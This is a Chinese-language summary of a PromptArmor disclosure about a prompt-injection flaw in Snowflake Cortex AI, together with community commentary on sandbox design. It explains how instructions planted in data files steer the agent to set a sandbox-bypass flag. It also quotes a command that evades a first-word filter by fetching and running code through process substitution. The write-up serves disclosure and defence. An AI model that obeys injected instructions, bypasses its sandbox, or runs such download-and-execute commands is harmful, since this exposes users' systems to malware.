## 攻击概述

PromptArmor 报告了一个针对 Snowflake Cortex AI 的**提示词注入（Prompt Injection）漏洞**。攻击者通过在数据文件（如 README）中嵌入恶意指令，操控 Cortex Agent 执行沙箱外的恶意命令（包括下载并运行恶意软件）。

## 核心漏洞机制

1. **提示词注入**：攻击者在数据文件中植入恶意指令
2. **沙箱标志绕过**：Cortex 默认允许模型设置标志来绕过沙箱执行命令，注入的指令操控模型设置该标志
3. **命令执行过滤缺陷**：Snowflake 仅检查命令的第一个词（如 `cat` = 安全），但 `cat < <(sh < <(wget malware))` 可绕过检测
4. **无提示执行**：通过 process substitution 等语法，绕过人类批准直接执行危险命令

## 社区核心洞察

### 1. "沙箱"定义被滥用
- 如果被沙箱约束的东西能说"不带沙箱做这个"，那它就不是沙箱
- Snowflake 的安全边界存在于代码内部，而非外部强制约束
- **设计原则**：约束应 enforced outside the prompt/context layer（在运行时、协议层或审批层强制），而非依赖模型遵守指令

### 2. 提示词注入是根本性问题，难以解决
- SQL 注入靠参数化查询解决，但自然语言没有等价方案
- 将指令和数据放在同一流中，最终结果必然相同
- **可能的出路**：双输入模型（一个指令输入、一个数据输入），类似 prepared statements，但这会破坏代理的核心前提——代理需要从数据中执行指令

### 3. 危险的命令过滤方式
- 只检查命令第一个词的过滤方式"是 1990 年代输入验证问题披着 2026 的外衣"
- 应在 OS 层面做限制，而非在 shell 代码解析层面
- "即使配置了沙箱，如果没有 workspace trust，实际上就没有范围限制"

### 4. 人类同样会被欺骗
- 人类也会被钓鱼邮件欺骗
- 如果能告诉代理"不要运行恶意软件"，那还给它运行 curl 的能力干嘛
- 应该假设任何技术上有能力做某事的主体（人或代理）都有可能绕过限制

### 5. Snowflake 的修复
- Snowflake 员工确认漏洞已发现、验证并修复部署
- 详细时间线见：[Snowflake 官方回应](https://community.snowflake.com/s/article/PromptArmor-Report---Snowflake-Response)
